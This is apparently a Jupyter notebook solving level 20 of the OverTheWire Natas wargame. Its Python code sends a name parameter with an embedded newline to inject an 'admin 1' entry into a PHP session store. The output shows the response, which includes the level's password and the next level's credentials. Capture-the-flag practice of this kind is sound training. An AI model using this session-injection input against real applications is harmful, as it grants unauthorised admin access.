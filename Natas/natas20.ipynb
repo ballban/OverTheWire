{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1829\n",
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas20\", \"pass\": \"guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH\" };</script></head>\n",
      "<body>\n",
      "<h1>natas20</h1>\n",
      "<div id=\"content\">\n",
      "DEBUG: MYREAD key<br>DEBUG: Reading from /var/lib/php/sessions/mysess_key<br>DEBUG: Read [name admin]<br>DEBUG: Read [admin 1]<br>DEBUG: Read []<br>DEBUG: Name set to admin\n",
      "admin 1<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas21\n",
      "Password: 89OWrTkGmiLZLv12JY4tLj2c4FW0xn56</pre>\n",
      "<form action=\"index.php\" method=\"POST\">\n",
      "Your name: <input name=\"name\" value=\"admin\n",
      "admin 1\"><br>\n",
      "<input type=\"submit\" value=\"Change name\" />\n",
      "</form>\n",
      "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
      "</div>\n",
      "</body>\n",
      "</html>\n",
      "DEBUG: MYWRITE key name|s:13:\"admin\n",
      "admin 1\";admin|s:1:\"1\";<br>DEBUG: Saving in /var/lib/php/sessions/mysess_key<br>DEBUG: admin => 1<br>DEBUG: name => admin\n",
      "admin 1<br><br />\n",
      "<b>Warning</b>:  Unknown: Session callback expects true/false return value in <b>Unknown</b> on line <b>0</b><br />\n",
      "<br />\n",
      "<b>Warning</b>:  Unknown: Failed to write session data using user defined save handler. (session.save_path: /var/lib/php/sessions) in <b>Unknown</b> on line <b>0</b><br />\n",
      "\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "from IPython.display import clear_output\n",
    "\n",
    "url = f'http://natas20.natas.labs.overthewire.org/index.php?debug=1'\n",
    "cookies = dict(PHPSESSID='key')\n",
    "params = dict(name='admin\\nadmin 1')\n",
    "result = requests.get(url, auth=(\"natas20\", \"guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH\"), cookies=cookies, params=params)\n",
    "print(len(result.text))\n",
    "print(result.text)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
